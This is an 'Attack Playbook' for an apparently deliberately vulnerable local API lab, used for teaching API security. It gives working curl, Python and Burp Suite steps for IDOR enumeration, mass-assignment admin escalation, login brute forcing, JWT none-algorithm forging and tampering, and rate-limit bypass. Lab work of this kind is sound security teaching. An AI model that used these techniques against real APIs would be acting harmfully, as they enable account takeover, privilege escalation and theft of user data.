# Attack Playbook

Complete reproduction guide for all vulnerability demonstrations.

**Prerequisites:** Lab running in vulnerable mode on `http://localhost:8000`

---

## Setup

```bash
# Start vulnerable mode
docker compose -f docker-compose.yml -f docker-compose.vulnerable.yml up -d

# Verify running
curl http://localhost:8000/health
# {"status":"ok","mode":"vulnerable",...}

# Get a token for user1
export TOKEN=$(curl -s -X POST http://localhost:8000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password1"}' \
  | python -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Token: $TOKEN"
```

---

## Attack 1: BOLA/IDOR Enumeration

### Manual (curl)

```bash
# As user1, access user5's private profile
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:8000/api/users/5/profile

# Expected vulnerable output includes:
# {
#   "id": 5,
#   "password_hash": "$2b$12$...",
#   "is_admin": false,
#   "internal_id": "...",
#   ...
# }
```

### Automated Script

```bash
TARGET_URL=http://localhost:8000 python offensive/bola_enum.py
# Enumerates IDs 1-100
# Shows rich table with exposed usernames, emails, leaked fields
# Saves JSON report to reports/bola_enum_results.json
```

### Burp Suite Walkthrough

1. Open Burp Suite → Proxy → Intercept ON
2. Login as user1 via the browser (http://localhost:8000/docs)
3. Send `GET /api/users/1/profile` — capture in Proxy
4. Send to **Repeater** (Ctrl+R)
5. Change `1` to `5`, `6`, `7` — observe other users' data returned
6. Send to **Intruder**:
   - Attack type: **Sniper**
   - Position: mark the user ID in the path
   - Payload: Numbers 1 → 15
   - Start attack
7. Sort by response length — all 200s = BOLA confirmed

### Expected Results

| Mode | Result |
|---|---|
| Vulnerable | All 15 user profiles returned with `password_hash`, `internal_id` |
| Secured | 403 Forbidden for IDs other than own |

---

## Attack 2: Mass Assignment Privilege Escalation

### Manual (curl)

```bash
# Step 1: Check current is_admin status
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:8000/api/users/1/profile | python -m json.tool | grep is_admin

# Step 2: Send mass assignment payload
curl -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","email":"user1@lab.local","is_admin":true,"role":"admin"}' \
  http://localhost:8000/api/users/1

# Step 3: Verify escalation
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:8000/api/users/1/profile | python -m json.tool | grep is_admin
# Should show: "is_admin": true
```

### Automated Script

```bash
python offensive/mass_assignment.py
# Shows before/after is_admin comparison
```

### Burp Suite Walkthrough

1. Login and capture `PUT /api/users/1` in Proxy
2. Send to Repeater
3. Modify the JSON body to add: `"is_admin": true, "role": "admin"`
4. Send — observe 200 response
5. GET the profile again — `is_admin` is now `true`

---

## Attack 3: Credential Stuffing / Brute Force

### Manual (no rate limiting in vulnerable mode)

```bash
for pass in password wrong123 qwerty letmein; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    http://localhost:8000/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"user1\",\"password\":\"$pass\"}")
  echo "$pass -> HTTP $STATUS"
done
# All return 401, never 429 — no rate limiting
```

### Automated Script

```bash
python offensive/brute_force.py
# Sends 20 sequential attempts
# Reports when 429 is triggered (never in vulnerable mode)
# Shows time-to-compromise if password found
```

---

## Attack 4: JWT Tampering

### Attack 4a: None Algorithm

```bash
# Craft a none-alg token manually
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"14","roles":["admin"],"is_admin":true}' | base64 | tr -d '=' | tr '/+' '_-')
NONE_TOKEN="${HEADER}.${PAYLOAD}."

curl -H "Authorization: Bearer $NONE_TOKEN" \
  http://localhost:8000/admin/users
```

### Attack 4b: Payload Tampering

```python
# Decode token, change role, keep (now-invalid) signature
import base64, json

token = "eyJ..."  # your token
parts = token.split(".")
payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
payload["roles"] = ["admin"]
payload["is_admin"] = True
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
tampered = f"{parts[0]}.{new_payload}.{parts[2]}"  # invalid sig
# In vulnerable mode (weak secret) this still works if the server skips sig check
```

### Automated Script

```bash
python offensive/jwt_tamper.py
# Tests all 4 attack vectors and reports HTTP status for each
```

---

## Attack 5: Rate Limit Bypass Attempts

```bash
python offensive/rate_limit_bypass.py
# Tests X-Forwarded-For rotation, X-Real-IP injection, path encoding tricks
# Reports which techniques work in each mode
```

### Expected Results

| Technique | Vulnerable Mode | Secured Mode |
|---|---|---|
| X-Forwarded-For rotation | Effective (no rate limit) | Blocked (Kong ignores header for limit_by: ip) |
| X-Real-IP injection | Effective | Blocked |
| Path encoding | Effective | Blocked (Kong normalises paths) |
| Baseline (no bypass) | Effective (no limit) | Blocked after 5 requests |

---

## Burp Suite Configuration

### Intercept Setup

1. Configure browser proxy: `127.0.0.1:8080`
2. Add `localhost` to Burp's scope
3. Import Burp CA certificate to trust HTTPS (not needed for HTTP lab)

### Intruder for BOLA

```
Attack type: Sniper
Target: GET http://localhost:8000/api/users/§1§/profile
Headers: Authorization: Bearer <token>
Payload: Numbers, 1 to 50, step 1
```

### Intruder for Brute Force

```
Attack type: Sniper
Target: POST http://localhost:8000/auth/login
Body: {"username":"user1","password":"§password§"}
Payload: Simple list — password, 123456, qwerty, ...
```

### Decoder for JWT

1. Paste JWT in Decoder tab
2. Decode as Base64 — read payload
3. Modify `is_admin` to `true`
4. Re-encode and replace in Repeater request

---

## OWASP ZAP Active Scan

```bash
# Install ZAP CLI
pip install zaproxy

# Run active scan against vulnerable mode
zap-cli start
zap-cli open-url http://localhost:8000
zap-cli spider http://localhost:8000
zap-cli active-scan http://localhost:8000
zap-cli report -o zap-report.html -f html
```
